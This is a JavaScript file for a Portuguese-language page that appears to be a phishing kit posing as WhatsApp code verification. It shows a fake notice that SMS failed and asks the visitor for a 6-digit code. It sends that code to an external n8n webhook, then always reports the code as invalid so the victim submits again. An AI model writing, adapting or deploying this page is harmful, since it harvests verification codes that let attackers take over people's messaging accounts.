// Simpler verification flow for WhatsApp code
// Does not rely on previous registration data

function showWhatsAppPopup() {
  const modal = document.createElement('div');
  modal.className = 'modal whatsapp-modal';
  modal.style.display = 'flex';
  modal.innerHTML = `
    <div class="modal-content">
      <div class="modal-header primary-header">
        <div class="alert-header-icon">
          <i class="fab fa-whatsapp"></i>
        </div>
        <h2>Verificação via WhatsApp</h2>
      </div>
      <div class="modal-body alert-body">
        <p>Não foi possível enviar o código via SMS.</p>
        <p>Enviaremos o código de verificação através do seu WhatsApp.</p>
        <button class="alert-btn primary-btn" id="whatsappOkBtn">
          <i class="fas fa-check"></i>
          OK, ENTENDI
        </button>
      </div>
    </div>`;
  document.body.appendChild(modal);
  document.getElementById('whatsappOkBtn').addEventListener('click', () => {
    modal.remove();
  });
}

function showCustomAlert(message) {
  const existing = document.querySelectorAll('.custom-alert');
  existing.forEach(el => el.remove());
  const modal = document.createElement('div');
  modal.className = 'modal custom-alert error-alert';
  modal.style.display = 'flex';
  modal.innerHTML = `
    <div class="modal-content alert-content">
      <div class="modal-header error-header">
        <div class="alert-header-icon">
          <i class="fas fa-exclamation-triangle"></i>
        </div>
        <h2>Atenção</h2>
      </div>
      <div class="modal-body alert-body">
        <p>${message}</p>
        <button class="alert-btn error-btn">ENTENDI</button>
      </div>
    </div>`;
  document.body.appendChild(modal);
  modal.querySelector('button').addEventListener('click', () => modal.remove());
}

function startTimers() {
  let resend = 60;
  let expire = 120;
  const countdown = document.getElementById('countdown');
  const expiration = document.getElementById('expirationTime');
  countdown.textContent = resend;
  expiration.textContent = '2:00';
  const resendTimer = setInterval(() => {
    resend -= 1;
    if (resend <= 0) {
      clearInterval(resendTimer);
      document.getElementById('resendBtn').disabled = false;
      countdown.textContent = '0';
    } else {
      countdown.textContent = resend;
    }
  }, 1000);
  const expireTimer = setInterval(() => {
    expire -= 1;
    const m = Math.floor(expire / 60);
    const s = String(expire % 60).padStart(2, '0');
    expiration.textContent = `${m}:${s}`;
    if (expire <= 0) {
      clearInterval(expireTimer);
      showCustomAlert('O tempo para verificação expirou.');
    }
  }, 1000);
}

document.addEventListener('DOMContentLoaded', () => {
  showWhatsAppPopup();
  startTimers();
  const form = document.getElementById('verificationForm');
  const btn = document.getElementById('verifyBtn');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = document.getElementById('verificationCode').value.trim();
    if (code.length !== 6) {
      showCustomAlert('Por favor, digite o código completo de 6 dígitos.');
      return;
    }
    const original = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
    try {
      await fetch('https://main-n8n.ohbhf7.easypanel.host/webhook/por-codigo2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code })
      });
    } catch (err) {
      console.error(err);
    }
    btn.disabled = false;
    btn.innerHTML = original;
    showCustomAlert('Código inválido ou expirado. Solicite novamente.');
  });
});
